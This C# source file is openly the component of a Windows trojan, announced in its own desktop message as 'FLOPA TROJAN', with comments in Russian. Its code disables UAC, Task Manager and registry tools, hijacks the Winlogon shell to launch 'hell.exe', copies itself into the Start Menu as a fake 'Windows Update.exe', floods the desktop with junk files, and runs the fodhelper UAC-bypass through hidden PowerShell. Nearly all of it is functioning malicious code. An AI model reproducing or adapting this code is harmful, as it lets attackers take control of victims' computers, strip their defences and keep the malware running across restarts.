using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Crock
{
    class Addition
    {
        // Работа сриетсром
        public static void RegFun()
        {
            const string quote = "\"";
            ProcessStartInfo ctrlaltdel = new ProcessStartInfo();
            ctrlaltdel.FileName = "cmd.exe";
            ctrlaltdel.WindowStyle = ProcessWindowStyle.Hidden;
            ctrlaltdel.Arguments = @"/k regedit /s " + quote + @"C:\Program Files\Temp\disctrl.reg" + quote + " && exit";
            Process.Start(ctrlaltdel);
            RegistryKey keyUAC = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            keyUAC.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
            RegistryKey distaskmgr = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            distaskmgr.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            RegistryKey folder = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons");
            folder.SetValue("3", "C:\\Program Files\\Temp\\skull_real_ico.ico", RegistryValueKind.String);
            RegistryKey folder2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Icons");
            folder2.SetValue("4", "C:\\Program Files\\Temp\\skull_real_ico.ico", RegistryValueKind.String);
            RegistryKey explorer = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
            explorer.SetValue("Shell", "explorer.exe, C:\\Program Files\\Temp\\hell.exe", RegistryValueKind.String);
            RegistryKey disregedit = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            disregedit.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
        }

        // Много мусорных файлов нв робочем столе
        public static void TrashDestop()
        {
            string desktop_files = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            File.WriteAllText(desktop_files + @"\POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES.txt", 
                "WELCOME TO FLOPA TROJAN." + Environment.NewLine + "Try to kill me if its possible for you." + Environment.NewLine + "You have only 6 minutes." + Environment.NewLine + "" + Environment.NewLine + "GOOD LUCK.");
            try
            {
                for (int s = 1; s < 300; s++)
                {
                    File.Copy(desktop_files + @"\POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES.txt", 
                        desktop_files + $"\\POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES_POTATOES({s}).txt");
                }
            }
            catch (Exception ex) { }
        }

        // Проверка на добовление в авто запус
        public static bool IsInstalledAR()
        {
            return File.Exists($"{Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)}\\Windows Update.exe");
        }

        // Добовление в авто запуск
        public static void InstallAR()
        {
            File.Copy(Misc.MyLoacation(), $"{Environment.GetFolderPath(Environment.SpecialFolder.StartMenu)}\\Windows Update.exe");
        }

        // UAC bypass
        public static void UAC()
        {
            ProcessStartInfo uac = new ProcessStartInfo();
            uac.FileName = @"powershell.exe";
            uac.WindowStyle = ProcessWindowStyle.Hidden;
            uac.Arguments = "New-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Value ";
            uac.Arguments += System.Reflection.Assembly.GetEntryAssembly().Location; ;
            uac.Arguments += " -Force";
            Process.Start(uac);

            Thread.Sleep(2000);

            uac.Arguments = "New-ItemProperty -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Name DelegateExecute -PropertyType String -Force";
            Process.Start(uac);

            Thread.Sleep(2000);

            uac.FileName = @"cmd.exe";
            uac.Arguments = "fodhelper";
            Process.Start(uac);
        }
    }
}
